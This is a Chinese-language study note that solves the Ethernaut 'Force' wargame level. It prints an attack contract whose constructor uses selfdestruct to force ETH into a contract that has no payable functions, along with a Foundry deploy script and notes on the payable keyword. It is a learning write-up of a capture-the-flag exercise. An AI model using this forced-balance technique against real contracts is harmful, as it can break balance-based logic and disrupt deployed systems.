# Force 自毁函数

## 目标合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

目标:使账户余额>0

## 思路

* 自毁函数：`selfdestruct(payable(address))`,可以把合约内所有ETH转出并且销毁合约
* 间接调用：通过攻击合约调用目标合约，实现目的

## 攻击合约

攻击合约本身只定义了构造函数`constructor`:

1. 收到构造函数参数(addr)
2. 接收部署时的ETH
3. 调用 `selfdestruct`，把合约余额强制打入目标地址
4. 销毁合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "./Counter.sol";

contract Attack {
    constructor(address addr) payable {
        selfdestruct(payable(addr));
    }
}
```

在构造函数中直接做就可以了,这个攻击合约一旦部署完就会炸掉(?就这么描述吧比较形象)

这里`addr`是形参,payable针对的是整个构造函数,使其可以直接转账

自毁函数`selfdestruct(payable(addr))`这个payable和上边那个payable不冲突,作用不一样

攻击合约不会自己实例化,里边都是形参

## 脚本

用来部署攻击合约,并通过`selfdestruct`打钱

<font style="background-color:#f3bb2f;">合约实例化=部署攻击合约</font>,部署时执行构造函数

合约一部署完就会销毁并转账

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";//导入攻击合约

contract Attacksc is Script {
    function run() external {//注意格式,怎么写的多熟悉一下
        vm.startBroadcast();

        new Attack{value: 0.001 ether}(
            payable(0xE6f0065D74C9bdF6B1D9B48E2429f23EeaEad36d)
        );//这里就是在链上新建合约(合约实例化),触发攻击合约里的构造函数

        vm.stopBroadcast();
    }
}
```

## 查漏补缺

### forge init 创建项目

创一个新的空文件夹以后终端输入`forge init`即可

### payable

攻击合约中我对payable有点混淆

* 模式一

```solidity
contract Attack {
    constructor(address addr) payable {
        selfdestruct(payable(addr));
    }
```

* 模式二

```solidity
contract Attack {
    constructor(address payable addr) {
        selfdestruct(payable(addr));
    }
```

这两个模式是不一样的

模式一中payable针对的是整个构造函数,作用是能够直接转账

模式二中payable针对的是形参addr

### 其他脚本中的

一直不太懂这么多 attack

```solidity
Attack attack=new attack(地址)
```

这句子写在脚本里

第一个Attack是合约的实例

第二个attack是在我们这个合约的变量名字,可以随意设置,不要设置成和内置函数一样的就行

new attack就是部署一个(新攻击)合约的意思


> 更新: 2025-07-11 11:00:25  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/eriptocysdhqyhw3>